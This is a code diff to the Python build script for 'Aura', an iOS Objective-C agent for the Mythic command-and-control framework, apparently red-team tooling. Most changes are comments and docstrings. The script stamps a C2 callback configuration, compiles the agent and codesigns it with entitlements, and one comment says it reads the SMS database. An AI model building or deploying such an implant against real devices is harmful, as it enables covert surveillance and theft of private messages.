@@ -14,7 +14,7 @@ class Aura(PayloadType):
     supported_os = [SupportedOS.IOS]
     wrapper = False
     wrapped_payloads = []
-    note = """Objective-C payload supporting iOS 12."""
+    note = """Aura is an Objective-C payload supporting iOS."""
     supports_dynamic_loading = False
     c2_profiles = ["http"]
     mythic_encrypts = True
@@ -51,13 +51,13 @@ class Aura(PayloadType):
             params = self._extract_c2_parameters()
             await self._create_http_config(params)
 
-            # Compilation
+            # Compile the Agent
             os.makedirs(f"{self.build_path}", exist_ok=True)
             compile_link_cmd = self._generate_compile_command()
             print(f"\n{compile_link_cmd}\n")
             await self._run_command(compile_link_cmd, "Compiling and Linking Objective-C", resp)
 
-            # Codesigning the base entitlements
+            # Codesigning base entitlements
             codesign_command = self._generate_codesign_command()
             await self._run_command(codesign_command, "Signing entitlements", resp)
 
@@ -76,12 +76,12 @@ class Aura(PayloadType):
 
     async def _validate_build_settings(self):
         failed = False
-        # Check if paths exist
+        # Check if the iOS SDK exist
         if not pathlib.Path(self.sdk_path).exists():
             failed = True
             await self._update_build_step("Validating Build Settings", f"Error: SDK path not found at {self.sdk_path}", False)
         
-        # Check if clang compiler exists
+        # Check if clang exists
         if not pathlib.Path(self.clang_compiler_path).exists():
             failed = True
             await self._update_build_step("Validating Build Settings", f"Error: Clang compiler not found at {self.clang_compiler_path}", False)
@@ -90,6 +90,9 @@ class Aura(PayloadType):
             await self._update_build_step("Validating Build Settings", "Successfully gathered Aura sources", True)
 
     async def _update_build_step(self, step_name, step_stdout, step_success):
+        """
+        Sends an update on our build progress to Mythic.
+        """
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName=step_name,
@@ -98,11 +101,18 @@ class Aura(PayloadType):
         ))
 
     def _extract_c2_parameters(self):
+        """
+        Extract the C2 parameters provided by the Mythic operator.
+        """
         params = self.c2info[0].get_parameters_dict()
         print(f"\n\nPARAMS: {params}\n\n")
         return params
 
     async def _create_http_config(self, params):
+        """
+        Creates an Objective-C header "stamped" with the C2 configuration 
+        provided by the Mythic operator.
+        """
         callback_host = params.get("callback_host", "localhost")
         callback_port = params.get("callback_port", 80)
         callback_interval = params.get("callback_interval", 10)
@@ -197,6 +207,10 @@ class Aura(PayloadType):
         await self._update_build_step("Configuring C2", "Successfully stamped C2 config.", True)
 
     def _generate_compile_command(self):
+        """
+        Produces the clang command to compile and link our Objective-C payload.
+        """
+        # Our source files to compile
         source_files = [
             "main.m",
             "C2CheckIn.m",
@@ -216,23 +230,22 @@ class Aura(PayloadType):
             f"-I {self.agent_code_path}/c2_profiles "
             f"{source_file_paths} "
             f"-framework Foundation -framework UIKit "
-            f"-lsqlite3 "
+            f"-lsqlite3 " # We're using this to read from the SMS database (among others)
             f"-o {self.aura_payload_path} "
         )
 
     def _generate_codesign_command(self):
+        """
+        Codesign the payload with our base entitlements.
+        """
         entitlements_file = self.agent_code_path / "base_entitlements.plist"
         return f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"
 
     async def _run_command(self, command, step_name, resp):
-        # Print the command being run for better logging
-        print(f"\nRunning command for {step_name}:\n{command}\n")
-
-        # Use subprocess to run the command and capture both stdout and stderr
+        print(f"\Build phase {step_name}:\nExecuting: {command}\n")
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
 
-        # Log the output from the command
         if stdout:
             print(f"STDOUT from {step_name}: {stdout.decode()}")
             
@@ -240,11 +253,13 @@ class Aura(PayloadType):
         if process.returncode != 0:
             print(f"STDERR from {step_name}: {stderr.decode()}")
             error_message = f"Error during {step_name}:\n{stderr.decode()}"
-            print(error_message)  # Print to console for additional logging
+            print(error_message)
+            # Update Mythic
             await self._update_build_step(step_name, error_message, False)
             resp.set_status(BuildStatus.Error)
             resp.build_message = error_message
         else:
             success_message = f"Successfully completed {step_name}"
-            print(success_message)  # Print success message to console
+            print(success_message)
+            # Update Mythic
             await self._update_build_step(step_name, success_message, True)
